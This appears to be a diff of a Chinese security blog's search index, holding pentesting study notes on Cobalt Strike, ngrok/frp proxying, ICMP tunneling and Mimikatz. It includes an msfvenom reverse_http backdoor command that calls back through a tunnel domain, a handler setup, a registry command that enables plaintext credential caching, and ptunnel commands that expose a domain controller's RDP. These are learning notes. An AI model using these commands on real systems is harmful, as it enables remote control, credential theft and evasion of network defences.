+<h3><span id="转存hash">转存Hash</span></h3><p><img src="/../../images/xdnwaq/1651756812807.png" alt="1651756812807"></p>
+<ul>
+<li><h3><span id="执行cmd命令">执行CMD命令</span></h3></li>
+</ul>
+<p>Cobalt Strike 默认提供自带命令</p>
+<p><img src="/../../images/xdnwaq/1651757061320.png" alt="1651757061320"></p>
+<p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E8%BF%9B%E9%98%B6%5D.assets/1651757100401.png" alt="1651757100401"></p>
+<h3><span id="调用cmd">调用CMD</span></h3><p>如果要调用CMD命令的需要在输入框前面加一个**<code>shell</code>**</p>
+<p><img src="/../../images/xdnwaq/1651757351430.png" alt="1651757351430"></p>
+<h3><span id="文件管理">文件管理</span></h3><p><img src="/../../images/xdnwaq/1651757885221.png" alt="1651757885221"></p>
+<h3><span id="提权">提权</span></h3><p> <a href="https://x1aojun.lanzoub.com/i8pau04c9iyd">提权插件下载</a> </p>
+<p><img src="/../../images/xdnwaq/1651758026432.png" alt="1651758026432"></p>
+<p><img src="/../../images/xdnwaq/1651757981862.png" alt="1651757981862"></p>
+<p>多了很多插件</p>
+<p><img src="/../../images/xdnwaq/1651758356708.png" alt="1651758356708"></p>
 ]]></content>
       <categories>
-        <category>工具使用</category>
+        <category>小迪安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>小迪安全系列-[代理技术]</title>
+    <url>/2022/05/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%5D/</url>
+    <content><![CDATA[<p><img src="/../../images/xdnwaq/1651925898412.png" alt="1651925898412"></p>
+<blockquote>
+<p>代理技术和隧道技术都属于内网穿透，代理主要解决内网里面通信的问题（比如对方在内网，你也在内网，这时候两个内网实现通信就必须要经过代理才能实现，常见工具有frp、ngrok和ew等，ew（earthworm已经停止更新了，就不演示）），和一些防火墙的拦截<br>隧道主要是一些安全设备和流量监控设备上的拦截问题</p>
+</blockquote>
+<h2><span id="必要基础知识点">必要基础知识点：</span></h2><h2><span id="1内外网简单知识">1.内外网简单知识</span></h2><blockquote>
+<p><strong>内网ip地址是私有ip地址（<em>10&#x2F;8, 172.16&#x2F;12 , 192.168&#x2F;16</em>），除此之外就是公有ip</strong></p>
+</blockquote>
+<h2><span id="2内网1和内网2通信问题">2.内网1和内网2通信问题</span></h2><blockquote>
+<p><strong>1主机在内网1,2主机在内网2.就好比说你在学校宿舍上网，我在网吧上网，我们都属于内网，但是我们不是一个内网，您是学校内网，我是网吧内网，这两个网络如果要实现通信。比如我现在有个后门CS或者MSF生成一个后门发给你，你去执行这个后门，这个时候如果你能让对方上线到你这是上线不了的，因为你们都是内网，除非这个时候采用一些代理技术。你用CS想控制这台内网主机，你CS在另外一个内网，受害主机在一个内网，那么上线是不可能的。必须要借助代理</strong></p>
+</blockquote>
+<h2><span id="3正反向协议通信连接问题">3.正反向协议通信连接问题</span></h2><blockquote>
+<p><strong>正向代理就是正方向的连接，反向代理就是反方向的连接</strong><br><strong>什么是正方向，什么是反方向呢？</strong><br><strong>如果是控制端去连接被控制端的话，就属于正向代理，</strong><br><strong>被控制端去连接控制端就是反向代理。</strong></p>
+<p><strong>这个正向代理和反向代理为什么要区分开呢？</strong><br><strong>你的控制端如果是服务器，是外网一台主机，就是公网的一台服务器，就相当于你在外网有一个唯一的IP地址，通过这个IP地址你能够找到你；</strong><br><strong>被控制的肉鸡是内网，如果你去主动找这台被控的内网主机你是找不到的，</strong></p>
+</blockquote>
+<p><img src="/../../images/xdnwaq/1651926501330.png" alt="1651926501330"></p>
+<h2><span id="4内网穿透代理隧道技术说明">4.内网穿透代理隧道技术说明</span></h2><blockquote>
+<p><strong>隧道主要解决流量分析工具和流量监控工具 还有想防火墙过滤问题</strong><br><strong>代理主要解决网络的连通性问题</strong></p>
+</blockquote>
+<p><img src="/../../images/xdnwaq/1651926587727.png" alt="1651926587727"></p>
+<blockquote>
+<p>黑客在湖南局域网，肉鸡在上海局域网，你用的是自己内网里面的虚拟机kali生成的后门，你想实现控制上海的肉鸡。<br>理论上，如果你不涉及到代理，是绝对控制不了的，因为你两者都是内网，你生成后门的时候，你如果写你外网的木马地址的话，它去连接的时候找到的是你的路由器，你写你内网地址的话，那就更加找不到，它就不可能实现控制。</p>
+</blockquote>
+<blockquote>
+<p><strong>这时候就要借助ngrok这款工具来实现连通，它是怎么实现呢？下面简单把原理分析一下</strong></p>
+<p>​        用到ngrok这款工具的时候，ngrok会在外网启动一台服务器给你，相当于这台肉鸡想去找你的时候先去找这个服务器，服务器再传输给你。同样，如果你要找这台肉鸡，也要经过这台服务器，其实就是说，这款工具就是在中间架设一台外网服务器，因为这台外网服务器你和他都能访问，你找对面肉鸡的时候会经过外网服务器，这个数据要回连给控制端的时候也会找这台外网服务器，服务器会在控制端这里有个客户端，就相当于接收服务器给的数据，你出去，客户端给服务器；数据连通就是正常的！其实就是找了一个中介！</p>
+</blockquote>
+<h1><span id="演示案例">演示案例</span></h1><h2><span id="内网穿透ngrok测试演示-两个内网通讯上线">内网穿透Ngrok测试演示-两个内网通讯上线</span></h2><p> <strong>实验环境：</strong>两个不同的内网(有网络)实现穿透控制<br><strong>1.注册-购买-填写-确认<a href="http://www.ngrok.cc/%EF%BC%88%E5%9B%BD%E5%86%85%EF%BC%89">http://www.ngrok.cc/（国内）</a></strong><br>协议：http 本地端口：192.168.76.132:4444 </p>
+<h3><span id="开通隧道">开通隧道</span></h3><p><img src="/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF%5D.assets/1651927061288.png" alt="1651927061288"></p>
+<p><img src="/../../images/xdnwaq/1651927275953.png" alt="1651927275953"></p>
+<h3><span id="kali搭建隧道">Kali搭建隧道</span></h3><p> <strong>192.168.176.137:4444就是本机kali的ip地址</strong> </p>
+<p>Kali搭建sunny环境</p>
+<p><img src="/../../images/xdnwaq/1640708930372.png" alt="1640708930372"></p>
+<p><img src="/../../images/xdnwaq/1640709074892.png" alt="1640709074892"></p>
+<h3><span id="kali生成后门">Kali生成后门</span></h3><p>lhost主机地址是隧道地址，也就是说肉鸡执行木马之后会找到公网上的隧道地址</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">msfvenom -p windows/meterpreter/reverse_http lhost=junzi.free.idcfengye.com【购买隧道的域名】 lport=80 -f exe -o test.exe  <br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/1651985725753.png" alt="1651985725753"></p>
+<h3><span id="msf配置后门监听状态">MSF配置后门监听状态</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">use exploit/multi/handler<br>set payload windows/meterpreter/reverse_http<br>set lhost 192.168.76.132<br>set lport 4444<br>exploit<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/1640710640214.png" alt="1640710640214"></p>
+<h3><span id="肉鸡上线">肉鸡上线</span></h3><p>win7运行后门后，成功监听到</p>
+<p><img src="/../../images/xdnwaq/1640712114675.png" alt="1640712114675"></p>
+<h3><span id="原理刨析">原理刨析</span></h3><p>Kali和win7是在不同的局域网中，但是都能上网，普通的msf后门肯定是 不能让 win7上线成功的，但是借助一个外网服务器充当代理，那么就可以实现控制win7的目的</p>
+<p><img src="/../../images/xdnwaq/1640712970874.png" alt="1640712970874"></p>
+<h2><span id="案例2-内网穿透frp自建跳板测试-两个内网通讯上线">案例2-内网穿透Frp自建跳板测试-两个内网通讯上线</span></h2><p><a href="https://github.com/fatedier/frp/releases">Frp Github下载</a></p>
+<p> <strong>优点：自行搭建，方便修改，成本低，使用多样化</strong></p>
+]]></content>
+      <categories>
+        <category>小迪安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>小迪安全系列-[基础阶段]</title>
+    <url>/2022/04/18/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E5%9F%BA%E7%A1%80%E9%98%B6%E6%AE%B5%5D/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>小迪安全</category>
       </categories>
   </entry>
   <entry>
@@ -2099,18 +1963,6 @@
       </categories>
   </entry>
   <entry>
-    <title>渗透工具-[Mimikatz]</title>
-    <url>/2022/05/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7-%5BMimikatz%5D/</url>
-    <content><![CDATA[<p>一、工具简介<br>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。</p>
-<p>注意：<br>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure>
-
-]]></content>
-      <categories>
-        <category>工具使用</category>
-      </categories>
-  </entry>
-  <entry>
     <title>小迪安全系列-[文件包含]</title>
     <url>/2022/05/29/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%5D/</url>
     <content><![CDATA[<h1><span id="文件操作之文件包含漏洞全解">文件操作之文件包含漏洞全解</span></h1><p>sdfsdfsd文件操作</p>
@@ -2161,11 +2013,159 @@
       </categories>
   </entry>
   <entry>
+    <title>小迪安全系列-[隧道技术]</title>
+    <url>/2022/05/06/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97-%5B%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF%5D/</url>
+    <content><![CDATA[<h1><span id="域横向内网漫游-socks-代理隧道技术"><strong>域横向内网漫游 Socks 代理隧道技术</strong></span></h1><p><img src="/../../images/xdnwaq/165174493307521.png" alt="1651793307521"></p>
+<p>必备知识点:<br><strong>1.代理和隧道技术区别?</strong></p>
+<blockquote>
+<p><strong>代理解决网络通讯问题</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>隧道绕过端口屏蔽的通讯方式，如果防火墙拦截某个协议，端口，那么利用隧道技术改变通信协议进行绕过拦截</strong></p>
+</blockquote>
+<p><strong>2.隧道技术为了解决什么?</strong></p>
+<blockquote>
+<p><strong>为了解决某些协议，端口被防火墙拦截，通过隧道技术改变通信协议进行绕过，单独的通道来传输被拦截的东西</strong></p>
+</blockquote>
+<p><strong>3.隧道技术前期的必备条件?</strong></p>
+<blockquote>
+<p><strong>在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截</strong><br><strong>CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等</strong></p>
+</blockquote>
+<blockquote>
+<p><strong>隧道：在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢?这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</strong></p>
+</blockquote>
+<p><strong>常用的隧道技术有以下三种:</strong></p>
+<blockquote>
+<p><strong>网络层:IPv6隧道、ICMP隧道</strong></p>
+<p><strong>传输层:TCP隧道、UDP隧道、常规端口转发</strong></p>
+<p><strong>应用层:sSH 隧道、HTTP&#x2F;S 隧道、DNS 隧道</strong></p>
+</blockquote>
+<h1><span id="案例一网络传输应用层检测连通性">案例一：网络传输应用层检测连通性</span></h1><p>探针对方协议是否支持</p>
+<p>例如探针对方是否开启ICMP命令，我们只需要<code>ping</code>以下对方主机是否的到回显</p>
+<blockquote>
+<p>TCP协议 </p>
+<p>用瑞士军刀—netcat</p>
+<p>执行nc命令：nc <ip> &lt;端口&gt;</ip></p>
+</blockquote>
+<blockquote>
+<p>2.HTTP 协议</p>
+<p>用curl工具，执行curl &lt;IP地址：端口&gt;命令，如果远程主机开启了相对应的端口，且内网可连接外网的话，就会输出相应的端口信息</p>
+</blockquote>
+<blockquote>
+<p>ICMP协议</p>
+<p>用ping命令，执行ping &lt;IP地址&gt;&lt;&#x2F;域名&gt;</p>
+</blockquote>
+<blockquote>
+<p>DNS协议</p>
+<p>检测DNS连通性常用的命令是nslookup和did</p>
+<p><strong>nslookup是Windows自带的DNS探测命令</strong></p>
+<p><strong>dig是Linux系统自带的DNS探测命令</strong></p>
+</blockquote>
+<h1><span id="案例二网络层隧道ptunnel使用-检测利用">案例二：网络层隧道Ptunnel使用-检测,利用</span></h1><p><img src="/../../images/xdnwaq/1651814479104.png" alt="1651814479104"></p>
+<h2><span id="pingtunnel基础命令">Pingtunnel基础命令：</span></h2><p>pingtunnel是把TCP&#x2F;UDP&#x2F;SOCK5流量伪装成ICMP流量进行转发的工具</p>
+<p>老版本：<a href="https://github.com/esrrhs/pingtunnel/releases">https://github.com/esrrhs/pingtunnel/releases</a></p>
+<p> <a href="https://x1aojun.lanzoub.com/iW8uh04fawwj">蓝奏云</a>  密码:biuh </p>
+<blockquote>
+<p><strong>-x ：指定ICMP隧道连接的验证密码</strong><br><strong>-lp：指定要监听的本地TCP端口</strong><br><strong>-da：指定要转发的目标机器的IP地址</strong><br><strong>-dp：指定要转发的目标机器的TCP端口</strong><br><strong>-p：指定ICMP隧道连一段的IP地址</strong></p>
+</blockquote>
+<h2><span id="kali安装"><strong>Kali安装</strong></span></h2><p> git clone <a href="http://freshmeat.sourceforge.net/projects/ptunnel/">http://freshmeat.sourceforge.net/projects/ptunnel/</a></p>
+<p>或者： </p>
+<p>wget <a href="http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz">http://www.tcpdump.org/release/libpcap-1.9.0.tar.gz</a><br>tar zxvf libpcap-1.9.0.tar.gz </p>
+<p><a href="https://blog.csdn.net/markecheng/article/details/110352161">安装参考</a></p>
+<p>解析：Hacker控制了Webserver，同时web server有两块网卡，一个通向外网，一个通向内网</p>
+<p>目的：Hacker控制webserver，通过控制webserver远程打开Dc的3389给外网的Hacker，并且不使用TCP协议</p>
+<p><img src="/../../images/xdnwaq/1651814479104.png" alt="1651814479104"></p>
+<p>.&#x2F;ptunnel -x admin</p>
+<p>.&#x2F;ptunnel -p  webserverIP -lp Hacker端口 -da DcIP -dp DC的3389 -x 连接密码</p>
+<h1><span id="案例三-传输层转发隧道portmap使用-检测利用">案例三-传输层转发隧道Portmap使用-检测,利用</span></h1>]]></content>
+      <categories>
+        <category>小迪安全</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>渗透工具-[CobaltStrike]</title>
+    <url>/2022/05/03/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7-%5BCobaltStrike%5D%20/</url>
+    <content><![CDATA[<h1><span id="cobaltstrike40环境配置及使用">CobaltStrike4.0环境配置及使用</span></h1><h1><span id="cobaltstrike简介">Cobaltstrike简介</span></h1><blockquote>
+<p><strong>Cobalt Strike是一款美国Red Team开发的渗透测试神器，常被业界人称为CS，其拥有多种协议主机上线方式，集成了提权，凭据导出，端口转发，socket代理，office攻击，文件捆绑，钓鱼等功能。分为服务端（teamserver）和客户端，服务端是一个，客户端可以有多个，团队可进行分布式协团操作。客户端可在windows上运行，服务端必须在Linux上，且两者都需Java环境。</strong></p>
+</blockquote>
+<h1><span id="环境搭建">环境搭建</span></h1><h2><span id="环境搭建">环境搭建</span></h2><p> <strong>下载：<a href="https://zhiji.lanzoui.com/iYOvjp5hqra">CobaltStrike4.0</a> 密码：cs66</strong> </p>
+<blockquote>
+<p><strong>客户端：win10（自己的主机）</strong></p>
+<p><strong>服务端： ubuntu 20.04（国外vps服务器）</strong></p>
+</blockquote>
+<p>安装java环境<br>客户端windows的java环境配置可以看我前面的文章，这里就不再赘述，下面介绍服务端的配置</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">进入根目录</span><br>cd /<br><span class="hljs-meta prompt_">#</span><span class="language-bash">查看java是否安装</span><br>java -version<br><span class="hljs-meta prompt_">#</span><span class="language-bash">安装java</span><br>apt install openjdk-14-jre-headless<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p> 检查是否安装成功,返回面的内容，说明已经成功了 </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">root@vultr:/# java -version<br>openjdk version &quot;14.0.2&quot; 2020-07-14<br>OpenJDK Runtime Environment (build 14.0.2+12-Ubuntu-120.04)<br>OpenJDK 64-Bit Server VM (build 14.0.2+12-Ubuntu-120.04, mixed mode, sharing)<br></code></pre></td></tr></table></figure>
+
+
+
+<p> 环境变量 </p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">查看java的安装路径，这里提示我们在链接组java（提供/usr/bin/java）中只有一种选择，所以无需配置环境变量</span><br>root@vultr:/# update-alternatives --config java<br>There is only one alternative in link group java (providing /usr/bin/java): /usr/lib/jvm/java-14-openjdk-amd64/bin/java<br>Nothing to configure.<br><br></code></pre></td></tr></table></figure>
+
+
+
+
+
+<h3><span id="启动服务端">启动服务端</span></h3><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">给权限</span><br>chmod 777 ./teamserver<br><span class="hljs-meta prompt_">#</span><span class="language-bash">启动服务端</span><br>./teamserver vps的ip 连接密码<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../../images/xdnwaq/1651669739393.png" alt="1651669739393"></p>
+<h3><span id="客户端连接">客户端连接</span></h3><p>这里只需要将host修改为服务器端的ip地址，端口50050固定不（端口确保开启），用户名可以随便起，密码必须写服务器端的密码。</p>
+<p>连接成功，服务端搭建完毕</p>
+<p><img src="/../../images/xdnwaq/1640500886850.png" alt="1640500886850"></p>
+]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>渗透工具-[Mimikatz]</title>
+    <url>/2022/05/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7-%5BMimikatz%5D/</url>
+    <content><![CDATA[<p>一、工具简介<br>Mimikatz是法国人benjamin开发的一款功能强大的轻量级调试工具，本意是用来个人测试，但由于其功能强大，能够直接读取WindowsXP-2012等操作系统的明文密码而闻名于渗透测试，可以说是渗透必备工具。</p>
+<p>注意：<br>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f<br></code></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Kali汉化中文-[技巧系列]</title>
+    <url>/2022/05/11/%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97/Kali%E6%B1%89%E5%8C%96%E4%B8%AD%E6%96%87-%5B%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97%5D/</url>
+    <content><![CDATA[<ol>
+<li><p>打开终端输入：sudo dpkg-reconfigure locales</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sudo dpkg-reconfigure locales<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p><img src="/../../images/jq/1652284493685.png" alt="1652284493685"></p>
+<p><img src="/../../images/jq/1652284674948.png" alt="1652284674948"></p>
+<p><img src="/../../images/jq/1652284702962.png" alt="1652284702962"></p>
+<p>汉化完成</p>
+<p><img src="/../../images/jq/1652284751075.png" alt="1652284751075"></p>
+]]></content>
+      <categories>
+        <category>技巧系列</category>
+      </categories>
+  </entry>
+  <entry>
     <title>编程系列[python黑客编程]</title>
     <url>/2022/05/02/%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B/%E7%BC%96%E7%A8%8B%E7%B3%BB%E5%88%97%5Bpython%E9%BB%91%E5%AE%A2%E7%BC%96%E7%A8%8B%5D/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>黑客编程</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>Linux命令下载文件-[技巧系列]</title>
+    <url>/2022/05/12/%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97/Linux%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6-%5B%E6%8A%80%E5%B7%A7%E7%B3%BB%E5%88%97%5D/</url>
+    <content><![CDATA[<p>wget+文件下载链接</p>
+<p><img src="/../../images/jq/1652290754674.png" alt="1652290754674"></p>
+]]></content>
+      <categories>
+        <category>技巧系列</category>
       </categories>
   </entry>
 </search>
